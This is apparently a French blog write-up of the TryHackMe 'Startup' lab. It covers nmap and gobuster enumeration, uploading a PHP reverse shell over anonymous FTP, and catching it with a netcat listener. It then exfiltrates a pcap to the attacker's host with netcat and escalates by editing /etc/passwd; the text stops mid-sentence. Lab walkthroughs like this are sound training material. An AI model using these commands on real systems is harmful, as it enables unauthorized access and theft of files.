<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <title>Startup</title>
</head>
<body>
    <div class="container">
        <div class="head">
          <span> <a href="index.html">Achla95's blog</a></span>
          <span> <a href="#">Home</a></span>
          <span> <a href="#">whoami</a></span>
          <span> <a href="#">contact</a></span>
          <!--<div class="thm"><script src="https://tryhackme.com/badge/131505"></script></div>-->
        </div>
        <h1>Write-up : Startup</h1>
        <br>
        <br>
        <section class="article">
            <h2>Énumération</h2>
            <p>On commence par un petit nmap avec la commande :<span style="color: #007bff; background: rgb(21 27 39 / 10%) ;"> nmap -sC -sV 10.10.138.228</span>
                et on obtient le résultat suivant 
            </p>
            <img  class="displayed" src="../../img/res_nmap.PNG" alt="enum_lulz">
            <p>Nous avons 3 port ouverts : <span  style="color: #007bff; background: rgb(21 27 39 / 10%) ;">ssh:22, ftp:21 et http:80</span>
            on essayera donc de se connecter en anonymous au ftp un peu plus tard mais avant cela  
            on jette un coup d'oeil au site web tournant sur le port 80, on tombe sur une page classic, rien d'intéressant dans le code source,
            je vais donc essayer de voir s'il n'y a pas de dossier intéressant, on fuzze avec gobuster en utlisant la commande : 
            <span style="color: #007bff; background: rgb(21 27 39 / 10%) ;">gobuster dir -u http://10.10.138.228 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100</span>
            et on tombe sur  le dossier file/</p>
            <img  class="displayed" src="../../img/gobuster.PNG" alt="gobu_lulz">
            <p>Bingo !!! on a un dossier FTP ainsi q'un fichier nommé notice, rien de sympa dans le txt.
               Mon premier réflexe a été de me dire qu'on pouvais sans doute upload un reverse-shell en php
               donc on se connecte en anonymous sur le ftp on va dans la directory ftp/ et je tape la commande
               <span style="color: #007bff; background: rgb(21 27 39 / 10%) ;">put php-reverse-shell.php</span>
            </p>
            <img  class="displayed"src="../../img/ftp.PNG" alt="ftp_what?">
            <p>On refresh la page web on voit que notre reverse-shell c'est upload correctement ce qui va nous
                mener à l'exploitation...
            </p>
            <br>
            <h2>Exploitation</h2>
            <p>Maintenant que nous avons upload notre reverse-shell avant de l'éxécuter on set un listener avec netcat en tapant la commande suivante :
                <span style="color: #007bff; background: rgb(21 27 39 / 10%) ;">nc -lvnp 6666</span>et on obient avec 
                succès notre shell en tant que www-data. Il nous reste plus qu'a trouver un moyen d'augmenter ses privilèges...
            </p>
            <img class="displayed" src="../../img/nc.PNG" alt="cat_where?">
            <br>
            <h2>Privesc</h2>
            <p>Alors concernant le privesc j'ai pu voir que tout le monde avaient fait la même méthode
               Donc j'en ai utliser une autre mais avant en faisant un petit ls on obtient la réponse à la première
               question dans le fichier recipe.txt. Par la suite on voit un fichier nommé incidents en se déplacant
               dedans on tombe sur un fichier  nommé <span style="color: #007bff; background: rgb(21 27 39 / 10%) ;">suspicious.pcapng</span>              
            </p>
            <img  class="displayed" src="../../img/sus.PNG" alt="red_sus_hmmm!!!">
            <p>Pour le récuperer il nous suffit de taper les commandes suivantes afin de récuperer le fichier sur notre machine :
               Sur votre machine : <span style="color: #007bff; background: rgb(21 27 39 / 10%) ;"> nc -lvp "PORT" > "FILE</span> <br> et sur la machine victime :
               <span style="color: #007bff; background: rgb(21 27 39 / 10%) ;">nc "votre IP" "votre PORT (ex:1234)" < "FILE" </span>
               Une fois le fichier récuperé on fait tout simplement un strings suspicious.pcapng et en fouillant un peu
               on tombe sur le mdp pour le user lennie
            </p>
            <img class="displayed" src="../../img/pass.PNG" alt="grrrr">
            <p>On peut maitenant accéder au user lennie en faisant su lennie, cd /home/lennie puis ls et bingo
               on chope le flag user.txt. Enfin pour le privesc j'ai tout simplement modifier le /etc/passwd afin de pouvoir me connecter en tant que vragrant(user)
               qui lui possède les droits d'administrateur. Pour cela 
            </p>

        </section>
    </div>
</body>
</html>